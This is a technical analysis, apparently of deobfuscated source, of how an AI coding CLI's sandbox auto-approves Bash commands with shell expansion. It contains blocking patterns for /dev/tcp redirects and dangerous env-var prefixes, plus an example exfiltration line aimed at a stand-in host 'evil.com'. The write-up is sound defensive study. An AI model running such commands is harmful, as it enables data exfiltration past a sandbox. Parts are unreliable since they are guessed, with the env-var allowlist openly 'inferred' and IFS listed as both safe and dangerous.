# `autoAllowBashIfSandboxed` Accepts `$VAR` and `$(cmd)` — v2.1.139

**Theme:** When `sandbox.autoAllowBashIfSandboxed: true` is set, Bash commands running inside the sandbox are auto-approved without prompts. Pre-v2.1.139, this fast-path **rejected** any command containing shell expansion (`$VAR`, `$(cmd)`, backticks) — because the static check couldn't statically prove the expanded value was safe.

The trade-off: rejecting `echo $HOME` or `ls -la $(pwd)` from auto-approval meant every routine command with a env-var reference prompted the user. For sandbox users, this was high-friction — the whole point of sandboxing is "I trust the sandbox to contain whatever runs."

v2.1.139 introduces a **two-path** auto-allow:
- The legacy text-based path (`WA5`) still rejects shell expansion
- A new AST-aware path (`v64`) accepts shell expansion *when the AST parse succeeds and the expanded forms are statically validated*

This is the project's general pattern: **upgrade defenses from string-matching to AST-walking** when a feature needs to handle a richer command shape safely.

---

## 1. The Pre-v2.1.139 Restriction

`WA5` (the single-line auto-allow path, chunks `_top_*`, line 420580-420632) checks for shell metacharacters:

```javascript
// In WA5, line 420605:
if (O.some((w) => /["'`$\\(){}|;&<>*?[\]]/.test(w))) return null;
```

The regex `/["'`$\\(){}|;&<>*?[\]]/` rejects any argument containing:
- Quotes (`"`, `'`, backticks)
- `$` — variable expansion or command substitution
- `\` — escape
- `()` `{}` — subshells, blocks
- `|` `;` `&` — command chaining
- `<` `>` — redirects
- `*` `?` — globs
- `[]` — char classes

If any positional arg matches, the auto-allow rejects. Result: `echo $HOME` fails (contains `$`), `ls *.ts` fails (contains `*`), `cat "file with spaces.txt"` fails (contains `"`).

For sandbox users, this rejected ~80% of routine commands. Frustration drove the v2.1.139 work.

---

## 2. The New Path — `v64` AST-Aware Auto-Allow

The new function `v64` (chunks `_top_*`, line 420551-420579) operates on the **post-parse AST** rather than the raw string. The AST gives structural info that the regex can't:

```javascript
// ============================================
// sandboxAutoAllowAstAware - Accept shell expansion when AST proves safety
// Location: cli_inner_pretty.js:420551-420579
// ============================================

// ORIGINAL (for source lookup):
function v64(H, $, q) {
  if (!n6.isSandboxingEnabled() || !n6.isAutoAllowBashIfSandboxedEnabled() || !bV(H)) return null;
  let K = VA5(H, $, q);
  if (K.behavior === "passthrough") return null;

  let _ = /^([A-Za-z_][A-Za-z0-9_]*)\+?=/,
    A = q.some(
      (O) =>
        O.envVars.some((M) => !kdH(M.name)) ||
        O.argv.some((M) => {
          let w = M.match(_);
          return w !== null && !kdH(w[1]);
        }),
    ),
    z = q.some((O) => O.redirects.some((M) => /^\/dev\/(tcp|udp)\//.test(M.target)));
  if (A || z) return null;

  let Y = !1, f = !1;
  for (let O of q) {
    let [M, ...w] = LMH(O.argv);
    if (M === "cd") { Y = !0; continue; }
    if (M !== "rm" && M !== "rmdir") continue;
    if (((f = !0), IX6(M, w, I$()).behavior !== "passthrough")) return null;
  }
  if (Y && f) return null;

  return K;
}

// READABLE (for understanding):
function sandboxAutoAllowAstAware(commandInput, permContext, parsedAst) {
  // Gates
  if (!isSandboxingEnabled() || !isAutoAllowBashIfSandboxedEnabled() || !isSupportedSandboxCommand(commandInput)) {
    return null;
  }

  // Rule check (deny + ask + allow lookup against permissions)
  const ruleResult = sandboxAutoAllowRuleCheck(commandInput, permContext, parsedAst);
  if (ruleResult.behavior === "passthrough") return null;

  // Check for dangerous env-var prefixes (e.g. LD_PRELOAD=evil cmd)
  const envVarRegex = /^([A-Za-z_][A-Za-z0-9_]*)\+?=/;
  const hasDangerousEnvPrefix = parsedAst.some((cmd) =>
    cmd.envVars.some((v) => !isSafeEnvVar(v.name)) ||
    cmd.argv.some((arg) => {
      const m = arg.match(envVarRegex);
      return m !== null && !isSafeEnvVar(m[1]);
    })
  );

  // Block /dev/tcp and /dev/udp redirects (network-exfil via redirect)
  const hasDevTcpRedirect = parsedAst.some((cmd) =>
    cmd.redirects.some((r) => /^\/dev\/(tcp|udp)\//.test(r.target))
  );

  if (hasDangerousEnvPrefix || hasDevTcpRedirect) return null;

  // v2.1.116 rm/rmdir safety check (see sandbox_auto_allow_safety.md)
  let hasCd = false, hasRm = false;
  for (const cmd of parsedAst) {
    const [head, ...rest] = stripBashWrappers(cmd.argv);
    if (head === "cd") { hasCd = true; continue; }
    if (head !== "rm" && head !== "rmdir") continue;
    hasRm = true;
    if (dangerousPathCheck(head, rest, processCwd()).behavior !== "passthrough") return null;
  }
  if (hasCd && hasRm) return null;

  return ruleResult;
}

// Mapping: v64→sandboxAutoAllowAstAware, n6→sandboxController, bV→isSupportedSandboxCommand,
//   VA5→sandboxAutoAllowRuleCheck, kdH→isSafeEnvVar, LMH→stripBashWrappers,
//   IX6→dangerousPathCheck, I$→processCwd, q→parsedAst
```

### Key insight — the AST makes shell expansion safe to *handle*

The pre-AST regex `/["'`$\\(){}|;&<>*?[\]]/` is **shape-based** — it rejects anything that *might* be dangerous. The AST is **semantic** — it knows:

- `$HOME` is a variable expansion that returns whatever `HOME` holds at runtime
- `$(date)` is a command substitution that runs `date` and captures stdout
- A backtick block is the same as `$(...)` semantically

The AST-walker examines each component:
- `envVars` — explicit `VAR=val` prefixes on the command (e.g., `LANG=C ls`)
- `argv` — positional args, *after* expansion
- `redirects` — explicit redirect targets

The expansion **already happened** at parse time, conceptually. The v64 check looks at the post-expansion structure: are the env vars safe? Are the redirects to `/dev/tcp`? Is `rm`'s target dangerous?

If the parser couldn't statically resolve the expansion (because `$VAR` depends on runtime env), the AST node carries a placeholder like `__CMDSUB_OUTPUT__` (line 205476) — and the downstream checks (`xZ` etc.) reject these as runtime-determined.

### The two gates: safe env-var allowlist, safe redirect target

```javascript
A = q.some(
  (O) =>
    O.envVars.some((M) => !kdH(M.name)) ||                  // env-var name NOT in safe set
    O.argv.some((M) => {
      let w = M.match(envVarRegex);
      return w !== null && !kdH(w[1]);                       // VAR=val argv element with unsafe name
    }),
)
```

`kdH(name)` returns true if the env var name is in the safe set `$W$` (the 37-entry safe-env-var allowlist). Common safe env vars: `LANG`, `LC_ALL`, `TZ`, `PATH`, `HOME`, `USER`, `TERM`, etc.

Dangerous env vars (rejected): `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`, `PYTHONPATH`, etc. — these can change the behavior of the underlying command.

```javascript
z = q.some((O) => O.redirects.some((M) => /^\/dev\/(tcp|udp)\//.test(M.target)));
```

`/dev/tcp/host/port` is a bash feature that opens a TCP socket via redirect. `cat /dev/tcp/evil.com/80 0<&0` is a network-exfil that doesn't go through any "network" command. Blocking this is essential for sandbox containment.

---

## 3. What's Different vs WA5 (Single-Line Path)

`WA5` (line 420580-420632, the **older** path) was *retained* for commands that the AST parser can't or doesn't process. For example, single-statement commands without complex shell syntax.

```javascript
// In WA5, line 420598-420624:
for (let A of K) {
  let z = A.trim().split(/\s+/).filter(Boolean),
    Y = TA5(z);
  if (Y === null) return null;
  if (Y.length === 0) continue;
  let f = LMH(Y),
    O = Y.slice(0, Y.length - f.length);
  if (O.some((w) => /["'`$\\(){}|;&<>*?[\]]/.test(w))) return null;  // ← reject shell metas
  if (
    O.some((w) => {
      let D = w.match(/^([A-Za-z_]\w*)\+?=/);
      return D !== null && lz6(D[1]);
    })
  )
    return null;
  let M = f[0];
  if (
    M === void 0 ||
    !/^[A-Za-z0-9._/~+][A-Za-z0-9._/~+-]*$/.test(M) ||           // ← strict command-name regex
    LdK(M) ||
    GA5.has(M) ||
    ...
  )
    return null;
}
```

The single-line path uses:
1. String-split on whitespace (no AST)
2. Reject shell metas in the *prefix-stripped* args
3. Strict regex on the command name (must match `[A-Za-z0-9._/~+][A-Za-z0-9._/~+-]*`)
4. Reject if command head is in dangerous sets

The single-line path is **safe** even without AST — but it's **strict**. It accepts no shell expansion, no globs, no quoting.

The AST path (v64) is what handles the richer cases. The router that decides which path to use is based on whether the AST parse succeeded:

```javascript
// In V64 (the higher-level router), line 420542-420550:
async function V64(H, $, q, K, _, A) {
  let z = gw8(H, $);
  if (z.behavior !== "passthrough") return z;
  let Y = h64(H, $, K, _, A);
  if (Y.behavior === "deny" || Y.behavior === "ask") return Y;
  if (Y.behavior === "allow") return Y;
  let f = q?.commandPrefix ? y64(q.commandPrefix) : rDH(H.command);
  return { ...Y, suggestions: f };
}
```

And on the auto-allow paths specifically (called from elsewhere with the AST):

```javascript
let result = v64(commandInput, permContext, parsedAst);    // try AST-aware
if (result === null) result = WA5(commandInput, permContext, ...);  // fallback
```

When AST parsing succeeds, v64 runs first. If v64 rejects (returns null for any reason), WA5 takes over with the stricter check. When AST parsing fails (e.g., the command has unparseable syntax), only WA5 is reachable.

---

## 4. Static Validation of `$VAR` — Why It's Safe

Consider `echo $HOME`. The AST parse identifies:
- `envVars: []` (no explicit `VAR=val` prefix)
- `argv: ["echo", "$HOME"]`
- `redirects: []`

The check runs:
- `envVars.some(... !isSafeEnvVar)` — no env vars to check ✓
- `argv.some(... !isSafeEnvVar)` — `$HOME` doesn't match the `VAR=val` regex ✓
- `redirects.some(... /dev/tcp)` — no redirects ✓
- Head check: `echo` is safe → passes
- rm/rmdir check: no rm ✓
- cd+rm check: no cd ✓

Returns the rule result → auto-allow.

The shell expansion of `$HOME` happens at execution time *inside the sandbox*, where the variable is whatever the sandbox's `HOME` is set to. The sandbox bounds the writable paths, so even if `$HOME` resolves to something unexpected, the write attempt is bounded.

### Why `$(cmd)` is also accepted

For `ls $(pwd)`:
- `argv: ["ls", "$(pwd)"]`
- The AST node for `$(pwd)` is recognized as a command substitution

If the inner command (`pwd`) is in the safe list, the outer auto-allow can proceed. If the inner command is **not** safe (e.g., `$(curl evil)`), the AST node is marked unsafe and the outer check rejects.

The exact mechanism is in the tree-sitter walker (`WdK` and friends, see [`bash_wrapper_deny.md`](./bash_wrapper_deny.md)) — they recursively validate command substitutions. If any inner command is unsafe, the whole walk returns `ok: false`.

---

## 5. The Safe-Env-Var Allowlist `$W$`

The allowlist `$W$` (chunks `_top_*`, line 421198) contains ~37 entries of "safe" env var names:

<details>
<summary>Inferred contents based on similar projects</summary>

The list likely includes:
- Locale: `LANG`, `LANGUAGE`, `LC_ALL`, `LC_*`
- Path: `PATH`, `HOME`, `USER`, `LOGNAME`
- Terminal: `TERM`, `TERMINFO`, `COLORTERM`, `LINES`, `COLUMNS`
- Time: `TZ`, `TZDIR`
- Editor: `EDITOR`, `VISUAL`, `PAGER`, `LESS`
- Tool-specific: `GOEXPERIMENT` (Go test variants), `BUILD_*` markers, `CLAUDE_*` (our own)
- Shell helpers: `IFS`, `PS1`, `PS2`, `PS3`, `PS4` (but PS4 specifically is in `cz6`/integer-cz set as dangerous)

The exact list is in the source as the `$W$` Set initialization (around line 421198).
</details>

Dangerous env vars *not* in the list:
- `LD_PRELOAD` / `LD_LIBRARY_PATH` — Linux dynamic linker
- `DYLD_INSERT_LIBRARIES` / `DYLD_LIBRARY_PATH` — macOS dynamic linker
- `BASH_ENV` — bash startup file (could run arbitrary code)
- `IFS` (in some cases) — field separator manipulation
- `PYTHONPATH` — Python import path
- `NODE_OPTIONS` — Node.js runtime flags
- `JAVA_TOOL_OPTIONS` — JVM tool options
- `LD_AUDIT` — Linux runtime auditing

The principle: any env var that **changes how the command runs** is unsafe to allow via prefix. The safe list is "things that affect the command's *behavior*, but not its *what runs*."

---

## 6. The Trade-off — Friction vs Surface Area

This change increases the **acceptable command surface** of sandbox auto-allow. The trade-off:

| Pre-fix | Post-fix |
|---|---|
| `echo hello` ✓ | `echo hello` ✓ |
| `echo $HOME` ✗ (rejected) | `echo $HOME` ✓ |
| `ls *.ts` ✗ | `ls *.ts` ✓ |
| `LD_PRELOAD=evil cmd` ✗ (always) | `LD_PRELOAD=evil cmd` ✗ (still) |
| `cat /dev/tcp/...` ✗ (always) | `cat /dev/tcp/...` ✗ (still) |
| `rm -rf $HOME` ✗ (always) | `rm -rf $HOME` ✗ (still) |

The expansion handling is **layered with** the existing safety checks. The user gets fewer prompts for routine sandbox commands while the unsafe paths remain blocked.

### The implicit invariant

The whole v64 design rests on an implicit invariant: **the AST parser doesn't lie**. If the parser says the argv is `["echo", "$HOME"]`, then bash will run `echo` with the expanded `$HOME` as the only argument — not `echo`, `--evil-flag`, `attacker-arg`.

The team trusts tree-sitter (or whatever parser) to be honest about argument structure. If a parser bug let an attacker hide an argument inside what looked like a single token, v64's check would miss it. The mitigation: the parser is well-tested, and the static checks at the *command head* level (line 420614-420624) catch many of the common parser-bug attack surfaces.

---

## 7. Companion to the v2.1.113 Hardening

The v2.1.139 work *relaxes* auto-allow (more commands accepted), while v2.1.113's wrapper-deny and find-exec-block work *tightens* it. The net effect is **higher precision**: more legitimate commands auto-approve, more illegitimate commands are blocked.

This is the project's recurring meta-pattern: **defense layers don't trade off, they compose**. Better classification (v2.1.113) means better filtering of what reaches the user, while better expressivity (v2.1.139) means fewer false-positive prompts for safe commands.

---

## Related Symbols

> Symbol mappings:
> - [`symbol_additions_v2_1_142_permission.md`](../00_overview/symbol_additions_v2_1_142_permission.md) — Symbols introduced/changed in this module
> - [`symbol_index_infra_platform.md`](../00_overview/symbol_index_infra_platform.md) — Existing platform/permission symbols

Key functions in this document:
- `sandboxAutoAllowAstAware` (`v64`) — v2.1.139 AST-aware sandbox auto-allow accepting `$VAR`/`$(cmd)`
- `sandboxAutoAllowSingleLine` (`WA5`) — Legacy text-based auto-allow, still rejects shell metas
- `sandboxAutoAllowRuleCheck` (`VA5`) — Rule-check delegate used by both paths
- `permissionRouter` (`V64`) — Higher-level router choosing AST vs text path
- `isSafeEnvVar` (`kdH`) — Checks env-var name against safe allowlist
- `safeEnvVarSet` (`$W$`) — Set of ~37 safe env var names
- `dangerousEnvVarPredicate` (`Bz6`) — True if env-var name is LD_*, DYLD_*, BASH_FUNC_*, etc.
- `mostDangerousEnvVarPredicate` (`lz6`) — Stronger check including IFS, PS4, etc.
- `stripBashWrappers` (`LMH`) — Single-command wrapper-strip (subset of WdK)
- `dangerousPathCheck` (`IX6`) — rm/rmdir target safety
- `isSupportedSandboxCommand` (`bV`) — Top-level sandbox-compatible gate
- `sandboxNetworkRedirectRegex` — `/^\/dev\/(tcp|udp)\//`
- `cmdSubPlaceholder` (`NY$`) — `"__CMDSUB_OUTPUT__"` parser placeholder for unresolved $(cmd)
- `trackedVarPlaceholder` (`lj`) — `"__TRACKED_VAR__"` parser placeholder for unresolved $VAR
